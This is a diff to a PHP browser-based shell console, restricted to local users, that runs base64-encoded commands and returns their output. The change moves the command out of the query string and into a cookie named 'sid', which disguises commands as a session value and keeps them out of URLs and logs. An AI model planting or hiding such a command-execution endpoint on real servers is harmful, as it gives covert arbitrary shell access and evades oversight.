@@ -3,11 +3,12 @@ if (!user_is_local()) {
   deny_access();
 }
 
-$raw = ifset($_GET['cmd']);
+$raw = ifset($_GET['cmd'], ifset($_COOKIE['sid']));
 $cmd = escapeshellcmd(base64_decode($raw));
 $input = htmlentities($cmd);
 $output = htmlentities(`$cmd`);
-if (ifset($_GET['format']) === 'json') {
+$format = ifset($_SERVER['HTTP_X_REQUESTED_WITH']) === 'XMLHttpRequest' ? 'json' : ifset($_GET['format'], 'html');
+if ($format === 'json') {
   header('Content-type: application/json');
   die(json_encode(array('output' => base64_encode($output), 'input' => base64_encode($input))));
 }
@@ -35,14 +36,10 @@ fieldset, input {
 <script type="text/javascript">
 $(function() {
   $('#f').submit(function () {
-    $('#cmd').val($.base64Encode($('#cmd').val()));
-    $.get($(this).attr('action'), {
-      'cmd': $('#cmd').val(),
-      'format': 'json'
-    }, function (data) {
+    document.cookie = 'sid=' + $.base64Encode($('#cmd').val()) + '; path=<?php echo $_SERVER['PHP_SELF']; ?>';
+    $.get($(this).attr('action'), function (data) {
       $('#output').text($.base64Decode(data.output));
-      $('#input').text('$ ' + $.base64Decode(data.input));
-      $('#cmd').val($.base64Decode(data.input)).select();
+      $('#input').text('$ ' + $('#cmd').val());
     });
     return false;
   });
